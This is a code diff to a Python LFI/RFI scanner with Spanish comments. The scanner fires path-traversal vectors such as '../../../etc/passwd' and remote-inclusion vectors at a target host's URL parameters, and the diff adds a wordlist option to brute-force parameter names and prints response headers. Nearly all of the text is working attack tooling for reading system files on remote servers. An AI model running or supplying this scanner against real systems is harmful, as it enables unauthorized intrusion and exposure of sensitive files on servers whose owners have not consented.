@@ -3,6 +3,7 @@ import urllib.parse
 import requests
 import signal
 import sys
+from os import path
 BANNER = """
 ,-.      .--.   _____.-.   .-. .---.  .-.  .-..-. .-.               
 | |     / /\ \ /___  /\ \_/ )// .-. ) | |/\| ||  \| |               
@@ -26,8 +27,6 @@ def signal_handler(sig, frame):
     print("\n [<-] Saliendo...")
     sys.exit(0)
 
- 
-
 signal.signal(signal.SIGINT, signal_handler)
 
 def check_lfi_success(response_text):
@@ -46,10 +45,11 @@ def main():
     parser.add_argument('--lhost', type=str, required=True, help='Dirección del host local para RFI')
     parser.add_argument('--lport', type=int, required=True, help='Puerto del host local para RFI')
     parser.add_argument('--field', type=str, required=True, help='Nombre del campo de archivo en la URL')
-
+    parser.add_argument('--wordlist', type=str, required=True, help='diccionario para fuerza bruta' )
     args = parser.parse_args()
 
     # Construir la URL base con diferentes campos
+
     base_urls = [
         f"http://{args.rhost}:{args.rport}/?{args.field}=",
         f"http://{args.rhost}:{args.rport}/?cat=",
@@ -78,7 +78,12 @@ def main():
         f"http://{args.rhost}:{args.rport}/?mod=",
         f"http://{args.rhost}:{args.rport}/?conf="
     ]
-
+    if path.exists(args.wordlist):
+        wordlist = open(args.wordlist, 'r')
+        wordlist = wordlist.read().split('\n')
+        for s in wordlist:
+            base_urls.append(f"http://{args.rhost}:{args.rport}/?{s}=")
+            base_urls.append(f"http://{args.rhost}:{args.rport}/{s}/?{s}=")
     # Definir los vectores de ataque LFI
     lfi_vectors = [
         "../../../etc/passwd",
@@ -108,28 +113,34 @@ def main():
     ]
 
     # Generar y verificar las URLs LFI
-    print("LFI Vectors:")
+    print("[;,;] LFI Vectors:")
     for base_url in base_urls:
         for vector in lfi_vectors:
             lfi_url = base_url + urllib.parse.quote(vector)
             lfi_r = requests.get(lfi_url)
+            cabeceras = dict(lfi_r.headers)
+            for x in cabeceras:
+                print("[h] " + x + " : " +cabeceras[x])
             print(lfi_url)
             if check_lfi_success(lfi_r.text):
-                print("LFI successful!")
+                print("[;,;] LFI successful!")
             else:
-                print("LFI failed.")
+                print("[:(] LFI failed.")
 
     # Generar y verificar las URLs RFI
-    print("\nRFI Vectors:")
+    print("\n[;,;] RFI Vectors:")
     for base_url in base_urls:
         for vector in rfi_vectors:
             rfi_url = base_url + urllib.parse.quote(vector)
             print(rfi_url)
             rfi_r = requests.get(rfi_url)
+            cabeceras = dict(rfi_r.headers)
+            for x in cabeceras:
+                print("[h] "+ x + " : " +cabeceras[x])
             if check_rfi_success(rfi_r.text):
-                print("RFI successful!")
+                print("[;,;] RFI successful!")
             else:
-                print("RFI failed.")
+                print("[:(] RFI failed.")
 
 if __name__ == "__main__":
     main()
